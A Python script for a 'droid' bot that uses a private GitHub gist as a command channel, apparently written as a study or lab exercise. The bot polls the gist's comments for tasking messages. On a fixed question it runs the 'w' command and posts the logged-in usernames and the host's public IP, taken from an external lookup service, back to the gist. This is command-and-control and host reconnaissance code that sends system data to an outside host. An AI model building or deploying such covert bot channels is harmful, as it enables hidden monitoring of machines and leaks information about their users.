import sys
import requests
import json
import time
from datetime import datetime
import subprocess


class Git:

    def __init__(self, github_gist_api, api_token):
        self.GITHUB_GIST_API = github_gist_api
        self.API_TOKEN = api_token
        self.gist_id = ""

    def create_gist(self, gist_name):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'scope': 'gist'}
        payload = {"description": "GIST created by python code",
                   "public": False,
                   "files": {gist_name: {"content": "Hello droids!"}}}

        res = requests.post(self.GITHUB_GIST_API, headers=headers, params=params, data=json.dumps(payload))
        if res.status_code != 201:
            print("Unable to create gist. Statu code " + str(res.status_code))
            print(res.text)
            exit(2)

        self.gist_id = json.loads(res.text)['id']

    def get_and_set_gist_id(self, gist_name):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}

        res = requests.get(self.GITHUB_GIST_API, headers=headers, params=params)

        if res.status_code != 200:
            print("Unable to get all gists. Statu code " + str(res.status_code))
            print(res.text)

        last_updated = ""
        for gist in json.loads(res.text):
            if gist_name in gist['files'].keys():
                if last_updated == "" or gist['updated_at'] > last_updated:
                    last_updated = gist['updated_at']
                    self.gist_id = gist['id']
        if self.gist_id == "":
            print("Unable to find gist " + gist_name + ".")
            exit(2)
        print("Using gist with id: " + self.gist_id)

    def add_comment_to_gist(self, content):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        payload = {"body": content}
        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"

        res = requests.post(url, headers=headers, data=json.dumps(payload))
        if res.status_code != 201:
            print("Unable to add comment to gist. Statu code " + str(res.status_code))
            print(res.text)

    def get_gist_comments(self):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}
        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"

        res = requests.get(url, headers=headers, params=params)
        if res.status_code != 200:
            print("Unable to get gist's comments " + self.gist_id + ". Statu code " + str(res.status_code))
            print(res.text)

        return json.loads(res.text)

    def remove_gist(self):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}
        url = self.GITHUB_GIST_API + "/" + self.gist_id

        res = requests.delete(url, headers=headers, params=params)
        if res.status_code != 204:
            print("Unable to remove gist " + self.gist_id + ". Statu code " + str(res.status_code))
            print(res.text)


def get_ip():
    return requests.get('https://api.ipify.org').content.decode('utf8')


def execute_command(command):
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
    return process.communicate()


def get_users(git, message):
    comment_message = "> " + message
    comment_message += "\n\nDroid with number " + ip + " reporting usage by: \n\n"
    bash_command = "w"
    output, error = execute_command(bash_command)
    lines = output.splitlines()
    for i in range(2, len(lines)):
        line = lines[i]
        comment_message += "- " + str(line.split()[0].decode("utf-8")) + "\n"

    git.add_comment_to_gist(comment_message)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Program requires arguments:\nGITHUB_API_TOKEN GIST_NAME")
        exit(1)

    github_gist_api = "https://api.github.com/gists"
    api_token = sys.argv[1]
    gist_name = sys.argv[2]
    git_instance = Git(github_gist_api, api_token)
    git_instance.get_and_set_gist_id(gist_name)
    last_comment_check = datetime.utcnow()
    ip = get_ip()
    date_format = "%Y-%m-%dT%H:%M:%SZ"

    while True:
        new_comments = []
        for comment in git_instance.get_gist_comments():
            if datetime.strptime(comment['updated_at'], date_format) > last_comment_check \
                    and comment['body'].startswith("# Question\n"):
                new_comments.append(comment)
        for comment in new_comments:
            date_time = datetime.strptime(comment['updated_at'], date_format)
            if date_time > last_comment_check:
                last_comment_check = date_time
            body = comment['body'].replace('# Question\n', '')
            if body.startswith("Droids, who uses you right now?"):
                get_users(git_instance, body)
        time.sleep(5)
